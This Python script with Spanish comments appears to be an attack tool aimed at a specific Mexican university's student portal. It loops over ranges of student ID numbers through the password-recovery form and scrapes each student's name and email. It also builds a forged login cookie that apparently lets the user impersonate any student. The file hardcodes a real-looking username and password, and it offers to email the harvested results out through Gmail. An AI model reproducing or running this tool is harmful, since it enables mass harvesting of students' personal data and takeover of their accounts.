#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#importamos modulo para  trabajar con el protocolo smpt
import smtplib
#modulo para hacer peticiones web
import mechanize
#modulo para agregar color
from termcolor import colored

banner = """
                   ,▄▄██▀▀█▄▄▄
                ,▄█▀-,▄▄▄▄▄▄,╙▀█▄
               ▄█-,▄█▀└    └▀█▄ ╙█▄
              █▌ ▄█└          "█▄ █▄
             ▐█  █          ╙█  █⌐ █
             ║█ ▐█           █L █▌ █⌐
             ▐█  █▄         ª▀ ╓█ ▐█
              ▀█  █▄         ,▄█ ,█^
              ,██  └▀█▄▄▄▄▄▄█▀└,▄█`
            ╓█▀ ▄█▀█▄ç     ,▄▄█▀└
          ▄█▀ ▄█▀    ╙▀▀▀▀▀▀└
        ▄█▀ ▄█Γ                 ,▄▄▄▄▄
      ▄█▀,▄▀└               ,▄█▀▀└   └▀█
 ▄▓█Φ█└╓█▀                 ██└        ▐█
█▌    ██                    █▄       ▄█
▀█   ,█▀             ▄█▀█▄   █▌  ,▄█▀└
 '▀▀▀▀              ▐█   ▀█   ▀▀▀▀-
                     ▀█▄▄▄█`
"""
#primer menu
advertencia = colored("""
El programa obtiene informacion a partir de
una matricula de estudiante.""", "red") + "\n"
menu1 = """
Seleccione una opcion:

1) Usar Una Matricula

2) Usar Varias Matriculas

3) Usar Un Rango de Matriculas
"""
#menu secundario
menu2 ="""
Seleccione una opcion:

1) Obtener Nombre

2) Obtener Correo

3) Obtener Cookie

4) Obtener Todo y enviar E-mail
"""
#usuario y clave por defecto para pruebas
llaves = colored("USUARIO: ", "red") + "18060004" + "\n" + colored("CLAVE: ", "red") + "almaguer99"

#creamos una funcion para enviar mensajes
def enviar():
    #solicitamos el correo de la persona
    correo_propio = input(colored("Ingresa tu correo: ", "blue"))
    #solicitamos su contraseña
    clave = input(colored("Ingresa tu clave: ", "blue"))
    #solicitamos el mensaje a enviar
    mensaje = input(colored("Ingresa el mensaje a enviar: ", "blue"))
    #solicitamos el correo de la persona
    correo_final = input(colored("Ingresa el correo del destinatario: ", "blue"))
    #creamos el servidor SMTP eligiendo la plataforma y el puerto
    server = smtplib.SMTP("smtp.gmail.com", 587)
    #iniciamos el protocolo tls
    server.starttls()
    #nos autenticamos
    server.login(correo_propio, clave)
    #enviamos el correo
    server.sendmail(correo_propio, correo_final, mensaje)
    #cerramos la secion
    server.quit()
    #mostramos mensaje de exito
    print("Correo enviado!")
    #mostramos una division
    print(colored("------------------------------------------------", "yellow"))
#creamos una funcion para establecer una conexion
def conexion(lista, modo):
    #url a usar
    url = "https://miportal.utc.edu.mx/RecuperarPassword.aspx"
    #creamos un objeto navegador
    buscador = mechanize.Browser()
    #iniciamos conexion
    pagina = buscador.open(url)
    #seleccionamos el formulario a llenar
    buscador.select_form(nr=0)
    #recorremos las matriculas ingresadas
    for matricula in lista:
        #ingresamos datos al formulario
        buscador.form["txtMatricula"] = matricula
        #enviamos los  datos
        respuesta = buscador.submit()
        #seleccionamos el formulario a llenar
        buscador.select_form(nr=0)
        #variables para saber si el alumno esta disponible
        comprobar = ""
        actual = ""
        #recorremos los controles
        for valor in buscador.controls:
            #guardamos la matricula escrita
            if valor.name == "txtMatricula":
                comprobar = valor.value
            #guardamos la matricula  encontrada
            elif valor.name == "hfMatricula":
                actual = valor.value
        if comprobar == actual:
            #imprimimos un divisor
            print(colored("------------------------------------------------", "yellow"))
            #nombre
            if modo == "1":
                #recorremos los controles
                for datos in buscador.controls:
                    #si el nombre del control es...
                    if datos.name == "lblNombre":
                        #imprimimos
                        print("Nombre:{}".format(datos.value))
            #correo
            elif modo == "2":
                #recorremos los controles
                for datos in buscador.controls:
                    #si el nombre del control es...
                    if datos.name == "hfCorreoElectronico":
                        #imprimimos
                        print("Correo:{}".format(datos.value))
            #cookie
            elif modo == "3":
                #recorremos los controles
                for datos in buscador.controls:
                    #si el nombre del control es...
                    if datos.name == "lblNombre":
                        #imprimimos un cookie
                        print(colored("Cookie:", "blue") + "SIIGAA_ALUMNOS_Login=Usuario={}&Nombre={}".format(actual, datos.value))
            #todos los datos
            elif modo == "4":
                #recorremos los controles
                for datos in buscador.controls:
                    #si el nombre del control es...
                    if datos.name == "txtMatricula":
                        #imprimimos
                        print(colored("Correo:", "blue") + datos.value)
                    #si el nombre del control es...
                    elif datos.name == "lblNombre":
                        #imprimimos
                        print(colored("Nombre:", "blue") + datos.value)
                    #si el nombre del control es...
                    elif datos.name == "hfCorreoElectronico":
                        #imprimimos
                        print(colored("Correo:", "blue") + datos.value)
                    #si el nombre del control es...
                    if datos.name == "lblNombre":
                        #imprimimos Cookie
                        print(colored("Cookie:", "blue") + "SIIGAA_ALUMNOS_Login=Usuario={}&Nombre={}".format(actual, datos.value))
            #imprimimos un divisor
            print(colored("------------------------------------------------", "yellow"))
        else:
            #imprimimos un divisor
            print(colored("------------------------------------------------", "yellow"))
            #imprimimos un divisor
            print(colored("ALUMNO NO REGISTRADO", "red"))
            #imprimimos un divisor
            print(colored("------------------------------------------------", "yellow"))
    buscador.close()
#definimos nuestra funcion principal
def main():
    #definimos variables globales
    global matriculas
    #creamos una variable tipo listas para almacenar las matriculas
    matriculas = []
    #imprimimos el banner
    print(banner)
    #mostramos la advertencia
    print(advertencia)
    #imprimimos las llaves por defecto
    print(llaves)
    #imprimimos el menu pricipal
    print(menu1)
    #solicitamos la opcion
    opcion1 = input("#: ")
    #si la opcion1 fue 1
    while True:
        if opcion1 == "1":
            #solicitamos la matricula
            matricula = input("\nIngresa La Matricula: ")
            #añadimos la matricula a la lista
            matriculas.append(matricula)
            #salimos del bucle
            break
        #si la opcion1 fue 2
        elif opcion1 == "2":
            #ejecutamos mientras...
            while True:
                #solicitamos matricula
                matricula = input("\nIngresa Una Matricula, Presiona Enter Para Terminar: ")
                #si el usuario inserto un dato...
                if matricula != "":
                    #agregalo a la lista
                    matriculas.append(matricula)
                #y si no
                else:
                    #salimos del bucle
                    break
            #salimos del bucle
            break
        #si la opcion1 fue 3
        elif opcion1 == "3":
            #solicitamos la matricula inicial
            matricula_inicial = int(input("\nIngresa La Matricula Inicial: "))
            #solicitamos la matricula final
            matricula_final = int(input("Ingresa La Matricula Final: "))
            for valor in range(matricula_inicial, matricula_final+1):
                matriculas.append(str(valor))
            break
        #y si no
        else:
            #mostramos un mensaje de error
            print("OPCION DESCONOCIDA!")
            #imprimimos el menu pricipal
            print(menu1)
            #solicitamos la opcion
            opcion1 = input("#: ")

    #imprimimos el menu secundario
    print(menu2)
    #solicitamos la opcion
    opcion2 = input("#: ")
    while True:
        #si la opcion2 fue 1
        if opcion2 == "1":
            #llamamos a la funcion conexion
            conexion(matriculas, "1")
            #salimos del bucle
            break
        #si la opcion2 fue 2
        if opcion2 == "2":
            #llamamos a la funcion conexion
            conexion(matriculas, "2")
            #salimos del bucle
            break
        #si la opcion2 fue 3
        if opcion2 == "3":
            #llamamos a la funcion conexion
            conexion(matriculas, "3")
            #salimos del bucle
            break
        #si la opcion2 fue
        if opcion2 == "4":
            #llamamos a la funcion conexion
            conexion(matriculas, "4")
            #llamamos la funcion de enviar correo
            enviar()
            #salimos del bucle
            break
        #y si no
        else:
            #mostramos un mensaje de error
            print("OPCION DESCONOCIDA!")
            #imprimimos el menu pricipal
            print(menu2)
            #solicitamos la opcion
            opcion2 = input("#: ")

#creamos un punto de acceso
if __name__ == '__main__':
    #llamamos a la funcion principal
    main()
